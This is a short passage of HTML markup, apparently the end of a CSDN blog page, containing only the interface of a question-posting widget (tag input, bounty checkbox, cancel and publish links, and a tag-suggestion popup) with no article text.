class="words">0</span><span class="cursor">0:0</span></div><div class="div_tags clearfix"><div id="divSearchTags" class="tags_con"><input type="text"></div><input type="hidden" name="txtSearchTags"></div><div id="ask2_tagRecomm_div" class="drt_tagRecomm"><span class="drt_tit">推荐标签：</span></div></div><div class="success"><div class="left_area"><input id="chk_cb" type="checkbox"><span class="wyxs">我要悬赏</span><input id="cb_num" class="cb_num" readonly="true"><span class="phib_rii"><span> 币</span></span></div><a href="http://blog.csdn.net/xifeijian/article/details/9348277#" nodetype="cancel" class="cancel">取消</a><a href="http://blog.csdn.net/xifeijian/article/details/9348277#" nodetype="ok" class="ok">发布</a></div></div><div id="common_ask_div_sc" class="searchContainer"><div class="sTitle">可能存在类似的问题：</div><div class="sFooter"><a class="sFirstNewAsk">我想提一个新问题</a></div></div><div id="tag-suggest-pop">
+  <div class="relative">
+    <div class="close"></div>
+    <div class="content"></div>
+  </div>
+</div></body></html>
